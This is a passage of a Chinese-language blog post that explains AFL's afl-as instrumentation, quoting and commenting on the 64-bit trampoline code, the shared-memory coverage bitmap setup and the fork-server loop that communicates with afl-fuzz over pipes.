&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后，如果进行了插桩，再插入<code>main_payload</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ins_lines)</span><br><span class="line">  <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (input_file) fclose(inf);</span><br><span class="line">fclose(outf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!ins_lines) WARNF(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                        pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span> OKF(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">           ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">           getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">           (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">           inst_ratio);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，综合来看，其实最终就是插入了两个部分：</p><ul><li>在每个基本块前面插入了<code>trampoline_fmt</code></li><li>在整体后面插入了<code>main_payload</code></li></ul><h2 id="trampoline-fmt-64">trampoline_fmt_64</h2><p>trampoline直译为蹦床代码，一般是在两种运行环境之间桥接的代码，比如不同语言写的代码之间的参数转换以及环境保存和恢复。</p><p>afl在插桩时，会根据架构的不同，插入两种不同的 <code>trampoline_fmt</code> 代码，此代码用来在每个基本块运行前，写入对应的全局的bitmap，用来标识当前进程运行时经过此基本块方便后面计算覆盖率以及发现新路径</p><p>这里的trampoline_fmt_64就是64位下的相应代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一段跳转代码， 前面用于保存参数，核心在于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line"><span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br></pre></td></tr></table></figure><p>在上文中可以看到，这里的rcx的值是fprintf 格式化的一个随机值，用来标识代码块，笔者其实有点疑惑为什么不用一个从0开始的值，然后一个个加上去，避免重复。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">        R(MAP_SIZE));</span><br></pre></td></tr></table></figure><p>核心调用的<code>__afl_maybe_log</code> 在 <code>main_payload</code> 中实现</p><h2 id="main-payload-64">main_payload_64</h2><p><code>main_payload_64</code>包含 <code>trampoline_fmt</code> 运行时所需要的一些函数以及全局变量，其中最核心的是 <code>__afl_maybe_log</code> 函数</p><p>这里整个流程大致如下(图源ScUpax0s师傅)</p><p><img src="/images/Pasted-image-20240228220636.png" alt="Pasted-image-20240228220636.png"></p><p>简单解释一下就是，在第一此运行时， <code>__afl_area_ptr==NULL</code> 和 <code>__afl_alobal_area==NULL</code>  均为true，说明此时是第一次运行到<code>__afl_maybe_log</code> ，此时会进入下面的分支，在完成初始化后，进程阻塞从管道中读取，直到收到afl-fuzz进程发送过来的启动命令，此时会fork一个子进程，此子进程并恢复寄存器，然后继续运行。</p><p>在之后，子进程再次进入桩代码就会直接进入 <code>__afl_store</code>，也就是写入当前基本块对应的bitmap用来标识运行状态</p><h3 id="第一次运行">第一次运行</h3><h4 id="初始化">初始化</h4><p>首先是检查共享内存是否初始化，也就是检查 <code>__afl_area_ptr</code> 是否为NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  seto  %al\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  testq %rdx, %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>如果没有，初始化共享内存并将指针保存至 <code>__afl_area_ptr</code>  和 <code>__afl_global_area</code></p><p>这里的共享内存的id 通过环境变量来传递，通过getenv获取 <code>AFL_SHM_ENV</code> ，然后map出共享内存，此共享内存用来保存运行时的bitmap，需要注意的是，虽然名为bitmap，但实际上此时，这里的bitmap仍然是用一byte而不是一bit来标识相应区域是否运行到的，因为此时可以通过byte位记录运行次数，并且对于每一位的访问也要比真正的bitmap快一些。</p><p>真正的bitmap要在之后，在afl-fuzz中，通过共享内存获得运行结果后，将此处对应的内存压缩成为真正的bitmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_setup:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne __afl_return\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Check out if we have a global pointer on file. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __APPLE__</span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  (%rdx), %rdx\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !^__APPLE__ */</span></span></span><br><span class="line">  <span class="string">&quot;  testq %rdx, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_first\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_store\n&quot;</span> </span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup_first:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Save everything that is not yet saved and that may be touched by\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     getenv() and several other libcalls we&#x27;ll be relying on. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq -352(%rsp), %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax,   0(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rcx,   8(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rdi,  16(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rsi,  32(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r8,   40(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r9,   48(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r10,  56(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r11,  64(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm0,  96(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm1,  112(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm2,  128(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm3,  144(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm4,  160(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm5,  176(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm6,  192(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm7,  208(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm8,  224(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm9,  240(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm10, 256(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm11, 272(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm12, 288(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm13, 304(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm14, 320(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm15, 336(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     original stack ptr in the callee-saved r12. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushq %r12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  %rsp, %r12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  subq  $16, %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;getenv&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testq %rax, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  %rax, %rdi\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;atoi&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;shmat&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpq $-1, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Store the address of the SHM region. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, (%rdx)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br></pre></td></tr></table></figure><p>然后再通过管道通知主进程此进程已经准备好了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_forkserver:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Enter the fork server mode to avoid the overhead of execve() calls. We\n&quot;</span></span><br><span class="line"><span class="string">&quot;     push rdx (area ptr) twice to keep stack alignment neat. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushq %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushq %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\n&quot;</span></span><br><span class="line"><span class="string">&quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;</span></span><br><span class="line"><span class="string">&quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;</span></span><br><span class="line"><span class="string">&quot;     the parent doesn&#x27;t want to use the fork server. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi       /* file desc */\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpq $4, %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jne  __afl_fork_resume\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><h4 id="afl-fork-wait-loop"><code>__afl_fork_wait_loop</code></h4><p><code>__afl_fork_wait_loop</code> 的作用是阻塞当前进程，直到从管道收到主进程发来的运行命令，如果收到了信号，则fork一个子进程，并调用 <code>__afl_fork_resume</code> 继续运行，否则继续阻塞</p><p>这里的和afl-fuzz通信用的管道的fd是相互约定好的，我们直到，此代码会插桩在需要fuzz的程序中，afl-fuzz会通过fork启动此程序，而fork是会继承文件描述符的，因此只要双方约定好一个确定的较大的文件描述符，即可相互通信</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_wait_loop:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Wait for parent by reading from the pipe. Abort if read fails. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;, %rdi             /* file desc */\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;read&quot;</span>)</span><br><span class="line"><span class="string">&quot;  cmpq $4, %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jne  __afl_die\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Once woken up, create a clone of our process. This is an excellent use\n&quot;</span></span><br><span class="line"><span class="string">&quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;</span></span><br><span class="line"><span class="string">&quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;</span></span><br><span class="line"><span class="string">&quot;     abort(), raise(), and a bunch of other things :-( */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;fork&quot;</span>)</span><br><span class="line"><span class="string">&quot;  cmpq $0, %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jl   __afl_die\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je   __afl_fork_resume\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* In parent process: write PID to pipe, then wait for child. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movl %eax, __afl_fork_pid(%rip)\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $4, %rdx                   /* length    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq __afl_fork_pid(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi             /* file desc */\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $0, %rdx                   /* no flags  */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq __afl_temp(%rip), %rsi     /* status    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq __afl_fork_pid(%rip), %rdi /* PID       */\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;waitpid&quot;</span>)</span><br><span class="line"><span class="string">&quot;  cmpq $0, %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jle  __afl_die\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Relay wait status to pipe, then loop back. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi         /* file desc */\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jmp  __afl_fork_wait_loop\n&quot;</span></span><br></pre></td></tr></table></figure><p><code>__afl_fork_resume</code> 用于恢复运行</p><p>实际上就是恢复了在栈中的寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_resume:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* In child process: close fds, resume execution. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;, %rdi\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;close&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;close&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  popq %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  popq %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %r12, %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;  popq %r12\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  0(%rsp), %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  8(%rsp), %rcx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 16(%rsp), %rdi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 32(%rsp), %rsi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 40(%rsp), %r8\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 48(%rsp), %r9\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 56(%rsp), %r10\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 64(%rsp), %r11\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  96(%rsp), %xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 112(%rsp), %xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 128(%rsp), %xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 144(%rsp), %xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 160(%rsp), %xmm4\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 176(%rsp), %xmm5\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 192(%rsp), %xmm6\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 208(%rsp), %xmm7\n&quot;</span></span><br><span 